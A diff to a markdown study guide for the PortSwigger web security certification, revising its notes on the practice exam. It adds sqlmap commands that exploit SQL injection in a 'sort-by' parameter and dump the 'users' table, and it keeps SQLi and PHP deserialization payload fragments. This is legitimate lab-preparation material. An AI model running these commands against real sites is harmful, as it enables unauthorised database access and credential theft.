@@ -1713,32 +1713,52 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 
 >In the [PortSwigger Practice Exam APP](https://portswigger.net/web-security/certification/takepracticeexam/index.html) we ***identify*** SQLi on the advance search function by adding a single quote and the response result in `HTTP/2 500 Internal Server Error`.  
 
->SQLMAP version `1.7.2#stable` is no longer able to exploit the PortSwigger Practice exam. I had a similar vulnerability in one of my BSCP Exams and was not able to exploit using SQLMAP.  
+>SQLMAP version `1.7.2#stable` and `1.6 both able to exploit the PortSwigger Practice exam. [bmdyy Practice Exam walkthrough of SQLMAP](https://youtu.be/yC0F05oggTE?t=563)  
 
 [PortSwigger Forum thread - SQLMAP](https://forum.portswigger.net/thread/stage-2-of-practice-exam-with-sqlmap-1-7-2-2078f927)  
 
->I took the practice exam again and validated that I had to manually run the exploit using [PortSwigger Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval), see this exercise [Blind time delay](#blind-time-delay).
+>I took the practice exam and was able to exploit SQLi using below payload.  
+
+```
+sqlmap -u 'https://TARGET.net/filtered_search?SearchTerm=x&sort-by=DATE&writer=' \ 
+  -H 'authority: 0afd007004402dacc1e7220100750051.web-security-academy.net' \
+  -H 'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'cookie: _lab=YesYesYesYes; session=YesYesYesYes' \
+  -H 'referer: https://TARGET.net/filtered_search?SearchTerm=x&sort-by=DATE&writer=' \
+  -H 'sec-ch-ua: "Chromium";v="111", "Not(A:Brand";v="8"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Linux"' \
+  -H 'sec-fetch-dest: document' \
+  -H 'sec-fetch-mode: navigate' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'sec-fetch-user: ?1' \
+  -H 'upgrade-insecure-requests: 1' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36' \
+  -p 'sort-by' -batch --flush-session --dbms postgresql --technique E --level 5
+  
+```  
+
+![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)  
 
 [SQLMAP Help usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)  
 
->Dump content from table **users** in the **public** database.  
+>SQLMAP DBS to get databases.  
 
 ```
-sqlmap -v -u 'https://TARGET.net/filter?category=*' -p "category" --batch --cookie="session=TheCookieValueCopied" --random-agent --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3
+-p 'sort-by' -batch --dbms postgresql --technique E --level 5 --dbs
 ```  
 
-![SQLMAP used to dump data from tables](images/sqlmap-dump-table-data.png)
-
->Use SQLMAP with a file that is the saved request where SQLi was ***identified***.  
+>Use SQLMAP dump tables identified from `public` database.  
 
 ```
-sqlmap -v -r ./March2023.txt --batch --random-agent --level=5 --risk=3 -p "sort-by" --dbms=PostgreSQL -D public -T users --dump --level=5 --risk=3 --tamper=space2comment
+-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public --tables
 ```  
 
->Use SQLMAP Technique parameter set type to error based instead of boolean-based blind vulnerability, and this speed up data Exfil process.  
+>ContinueUse SQLMAP `E` Technique to get the `users` content.  
 
-```bash
-sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flush-session --dbms postgresql --technique E --level=5  
+```
+-p 'sort-by' -batch --dbms postgresql --technique E --level 5 -D public -T users --dump
 ```  
 
 ### Non-Oracle Manual SQLi  
@@ -2821,7 +2841,7 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
   
 ### Burp Deserialization Scanner  
 
->Intercept the admin panel page request and ***identify*** the serial value of the cookie named **admin-prefs**. This challenge is from the [PortSwigger Practice Exam APP](https://portswigger.net/web-security/certification/takepracticeexam/index.html).  
+>Intercept the admin panel page in the Burp Practice Exam, and ***identify*** the serial value of the cookie named `admin-prefs`. This challenge is from the [PortSwigger Practice Exam APP](https://portswigger.net/web-security/certification/takepracticeexam/index.html).  
 
 ![Admin prefs serial cookie](images/admin-prefs-serial-cookie.png)  
 
